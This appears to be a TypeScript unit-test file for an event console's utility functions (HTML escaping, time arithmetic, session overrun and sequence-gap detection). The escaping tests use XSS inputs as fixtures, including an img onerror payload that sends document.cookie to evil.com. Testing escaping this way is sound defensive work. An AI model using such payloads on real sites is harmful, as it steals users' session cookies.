// tests/utils.spec.ts
// Unit tests for pure utility functions extracted from cuedeck-console.html.
// These run without a browser or live DB.

import { describe, it, expect } from 'vitest';

// ── esc() — HTML entity escaping ────────────────────────────────────────────
// Mirrors the esc() function in cuedeck-console.html (line ~2721).
// Kept in sync manually — if esc() changes in the HTML, update here too.
function esc(s: unknown): string {
  return String(s || '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

describe('esc() — XSS escaping', () => {
  it('escapes < and > (script tag injection)', () => {
    expect(esc('<script>alert(1)</script>')).toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
  });

  it('escapes img onerror payload', () => {
    expect(esc('<img src=x onerror=alert(1)>')).toBe('&lt;img src=x onerror=alert(1)&gt;');
  });

  it('escapes double quotes (attribute injection)', () => {
    expect(esc('" onclick="alert(1)')).toBe('&quot; onclick=&quot;alert(1)');
  });

  it('escapes ampersands', () => {
    expect(esc('A & B')).toBe('A &amp; B');
  });

  it('leaves plain text unchanged', () => {
    expect(esc('Hello, world!')).toBe('Hello, world!');
  });

  it('handles empty string', () => {
    expect(esc('')).toBe('');
  });

  it('handles null/undefined gracefully', () => {
    expect(esc(null)).toBe('');
    expect(esc(undefined)).toBe('');
  });

  it('handles numbers', () => {
    expect(esc(42)).toBe('42');
  });

  it('broadcast message with HTML is safely escaped', () => {
    // Regression: showBCBanner() uses innerHTML but passes message through esc()
    // A director sending malicious broadcast content must not execute in other clients.
    const malicious = '<img src=x onerror="fetch(\'https://evil.com?t=\'+document.cookie)">';
    const escaped = esc(malicious);
    // < and > must be escaped — these are what make tags executable in innerHTML
    expect(escaped).not.toContain('<img');
    expect(escaped).not.toContain('>');
    expect(escaped).toContain('&lt;img');
    expect(escaped).toContain('&gt;');
  });
});

// ── addMinutes() — TIME string arithmetic ───────────────────────────────────
// Mirrors addMinutes() in supabase/functions/_shared/transition.ts.
function addMinutes(timeStr: string, mins: number): string {
  const [h, m, s] = timeStr.split(':').map(Number);
  const total = h * 60 + m + mins;
  const nh = Math.floor(total / 60) % 24;
  const nm = total % 60;
  return `${String(nh).padStart(2, '0')}:${String(nm).padStart(2, '0')}:${String(s ?? 0).padStart(2, '0')}`;
}

describe('addMinutes() — TIME arithmetic', () => {
  it('adds minutes within the same hour', () => {
    expect(addMinutes('09:00:00', 15)).toBe('09:15:00');
  });

  it('rolls over to next hour', () => {
    expect(addMinutes('09:50:00', 15)).toBe('10:05:00');
  });

  it('handles zero minutes', () => {
    expect(addMinutes('14:30:00', 0)).toBe('14:30:00');
  });

  it('handles midnight rollover', () => {
    expect(addMinutes('23:50:00', 15)).toBe('00:05:00');
  });

  it('preserves seconds', () => {
    expect(addMinutes('10:00:30', 5)).toBe('10:05:30');
  });

  it('handles large delays (60+ minutes)', () => {
    expect(addMinutes('09:00:00', 90)).toBe('10:30:00');
  });
});

// ── OVERRUN detection logic ──────────────────────────────────────────────────
// Mirrors checkOverrunSessions() in cuedeck-console.html.
// Extracted as a pure predicate for unit testing without a browser or DB.

function toMins(timeStr: string): number {
  const [h, m] = timeStr.split(':').map(Number);
  return h * 60 + m;
}

interface Session {
  id: string;
  status: string;
  actual_start: string | null;
  scheduled_start: string;
  scheduled_end: string;
}

function isSessionOverrun(s: Session, nowMs: number): boolean {
  if (s.status !== 'LIVE' || !s.actual_start) return false;
  const elapsed = nowMs - new Date(s.actual_start).getTime();
  const durMs = (toMins(s.scheduled_end) - toMins(s.scheduled_start)) * 60_000;
  return elapsed > durMs && durMs > 0;
}

// Helper: build a LIVE session with a given actual_start (ms ago) and planned duration.
function liveSession(minsAgo: number, durationMins: number): Session {
  const startMs = Date.now() - minsAgo * 60_000;
  return {
    id: 'test-session-id',
    status: 'LIVE',
    actual_start: new Date(startMs).toISOString(),
    scheduled_start: '09:00:00',
    scheduled_end: `09:${String(durationMins).padStart(2, '0')}:00`,
  };
}

describe('OVERRUN auto-detection — isSessionOverrun()', () => {
  it('detects overrun when elapsed exceeds planned duration', () => {
    // Session planned for 30m, started 45m ago
    const s = liveSession(45, 30);
    expect(isSessionOverrun(s, Date.now())).toBe(true);
  });

  it('does NOT fire when session is still within planned duration', () => {
    // Session planned for 60m, started 30m ago
    const s = liveSession(30, 60);
    expect(isSessionOverrun(s, Date.now())).toBe(false);
  });

  it('does NOT fire when elapsed equals planned duration exactly (must exceed)', () => {
    // Session planned for 30m, started exactly 30m ago
    const s = liveSession(30, 30);
    // elapsed === durMs → not overrun yet (> not >=)
    expect(isSessionOverrun(s, Date.now())).toBe(false);
  });

  it('does NOT fire for non-LIVE sessions', () => {
    const s = { ...liveSession(45, 30), status: 'ENDED' };
    expect(isSessionOverrun(s, Date.now())).toBe(false);
  });

  it('does NOT fire when actual_start is null (session never went LIVE)', () => {
    const s: Session = {
      id: 'x',
      status: 'LIVE',
      actual_start: null,
      scheduled_start: '09:00:00',
      scheduled_end: '09:30:00',
    };
    expect(isSessionOverrun(s, Date.now())).toBe(false);
  });

  it('does NOT fire when durMs is zero (start == end)', () => {
    const s: Session = {
      id: 'x',
      status: 'LIVE',
      actual_start: new Date(Date.now() - 5_000).toISOString(),
      scheduled_start: '09:00:00',
      scheduled_end: '09:00:00',
    };
    expect(isSessionOverrun(s, Date.now())).toBe(false);
  });

  it('handles 1-second overrun (just crossed the boundary)', () => {
    // Duration 10m, started 10m + 2s ago
    const durationMins = 10;
    const startMs = Date.now() - (durationMins * 60_000 + 2_000);
    const s: Session = {
      id: 'x',
      status: 'LIVE',
      actual_start: new Date(startMs).toISOString(),
      scheduled_start: '09:00:00',
      scheduled_end: '09:10:00',
    };
    expect(isSessionOverrun(s, Date.now())).toBe(true);
  });
});

// ── PR-006: Realtime sequence gap detection ───────────────────────────────────
// Mirrors the seq-gap logic inside onSessionChange() in cuedeck-console.html.
// Extracted as a pure function for unit testing.

type SeqGapResult = 'stale' | 'gap' | 'ok' | 'unknown';

function detectSeqGap(
  newSeq: number | null | undefined,
  lastSeq: number | null | undefined,
): SeqGapResult {
  if (newSeq == null) return 'unknown';  // no seq column yet
  if (lastSeq == null) return 'ok';      // first event — seed the map
  if (newSeq <= lastSeq) return 'stale'; // duplicate or out-of-order
  if (newSeq > lastSeq + 1) return 'gap'; // one or more events dropped
  return 'ok';                            // sequential — newSeq === lastSeq + 1
}

describe('PR-006 — detectSeqGap()', () => {
  it('returns ok for sequential events', () => {
    expect(detectSeqGap(5, 4)).toBe('ok');
    expect(detectSeqGap(100, 99)).toBe('ok');
  });

  it('returns gap when events are skipped', () => {
    expect(detectSeqGap(7, 4)).toBe('gap');
    expect(detectSeqGap(10, 1)).toBe('gap');
  });

  it('returns stale for duplicate seq (same value)', () => {
    expect(detectSeqGap(5, 5)).toBe('stale');
  });

  it('returns stale for out-of-order (new < last)', () => {
    expect(detectSeqGap(3, 5)).toBe('stale');
  });

  it('returns ok for first event (lastSeq unknown)', () => {
    expect(detectSeqGap(1, null)).toBe('ok');
    expect(detectSeqGap(1, undefined)).toBe('ok');
  });

  it('returns unknown when row has no seq (migration not applied)', () => {
    expect(detectSeqGap(null, 5)).toBe('unknown');
    expect(detectSeqGap(undefined, 5)).toBe('unknown');
  });

  it('returns unknown when both are null', () => {
    expect(detectSeqGap(null, null)).toBe('unknown');
  });
});

// ── PR-010: getNextSession() ──────────────────────────────────────────────────
// Mirrors getNextSession() in cuedeck-console.html.
// Returns first non-ENDED/CANCELLED session after the live session in sort order.

interface FullSession extends Session {
  sort_order: number;
  title: string;
}

function getNextSession(sessions: FullSession[], liveSession: FullSession | null): FullSession | null {
  if (!liveSession) return null;
  return sessions.find(s =>
    s.sort_order > liveSession.sort_order &&
    !['ENDED', 'CANCELLED'].includes(s.status)
  ) || null;
}

function makeSession(overrides: Partial<FullSession>): FullSession {
  return {
    id: 'sess-1',
    status: 'PLANNED',
    actual_start: null,
    scheduled_start: '10:00:00',
    scheduled_end: '10:30:00',
    sort_order: 1,
    title: 'Test Session',
    ...overrides,
  };
}

describe('PR-010 — getNextSession()', () => {
  it('returns the next PLANNED session after live', () => {
    const live = makeSession({ id: 'a', status: 'LIVE', sort_order: 1 });
    const next = makeSession({ id: 'b', status: 'PLANNED', sort_order: 2 });
    expect(getNextSession([live, next], live)).toBe(next);
  });

  it('skips ENDED sessions when finding next', () => {
    const live = makeSession({ id: 'a', status: 'LIVE', sort_order: 1 });
    const ended = makeSession({ id: 'b', status: 'ENDED', sort_order: 2 });
    const ready = makeSession({ id: 'c', status: 'READY', sort_order: 3 });
    expect(getNextSession([live, ended, ready], live)).toBe(ready);
  });

  it('skips CANCELLED sessions when finding next', () => {
    const live = makeSession({ id: 'a', status: 'LIVE', sort_order: 1 });
    const cancelled = makeSession({ id: 'b', status: 'CANCELLED', sort_order: 2 });
    const planned = makeSession({ id: 'c', status: 'PLANNED', sort_order: 3 });
    expect(getNextSession([live, cancelled, planned], live)).toBe(planned);
  });

  it('returns null when no sessions follow the live session', () => {
    const live = makeSession({ id: 'a', status: 'LIVE', sort_order: 5 });
    const earlier = makeSession({ id: 'b', status: 'PLANNED', sort_order: 1 });
    expect(getNextSession([live, earlier], live)).toBeNull();
  });

  it('returns null when liveSession is null', () => {
    const planned = makeSession({ id: 'a', status: 'PLANNED', sort_order: 1 });
    expect(getNextSession([planned], null)).toBeNull();
  });

  it('returns null when all subsequent sessions are ENDED or CANCELLED', () => {
    const live = makeSession({ id: 'a', status: 'LIVE', sort_order: 1 });
    const e1 = makeSession({ id: 'b', status: 'ENDED', sort_order: 2 });
    const e2 = makeSession({ id: 'c', status: 'CANCELLED', sort_order: 3 });
    expect(getNextSession([live, e1, e2], live)).toBeNull();
  });

  it('finds next among many sessions (picks lowest sort_order)', () => {
    const live = makeSession({ id: 'a', status: 'LIVE', sort_order: 1 });
    const s2 = makeSession({ id: 'b', status: 'PLANNED', sort_order: 2 });
    const s3 = makeSession({ id: 'c', status: 'PLANNED', sort_order: 3 });
    // Array.find() returns first match — sort_order 2 comes before 3
    expect(getNextSession([live, s2, s3], live)).toBe(s2);
  });
});

// setViewMode() guard — pure logic
function applyViewMode(current: string, requested: string): string {
  if (current === requested) return current;
  return requested;
}

describe('setViewMode() — view mode state guard', () => {
  it('switches from list to timeline', () => {
    expect(applyViewMode('list', 'timeline')).toBe('timeline');
  });
  it('switches from timeline to list', () => {
    expect(applyViewMode('timeline', 'list')).toBe('list');
  });
  it('no-op when already in requested mode', () => {
    expect(applyViewMode('list', 'list')).toBe('list');
    expect(applyViewMode('timeline', 'timeline')).toBe('timeline');
  });
});
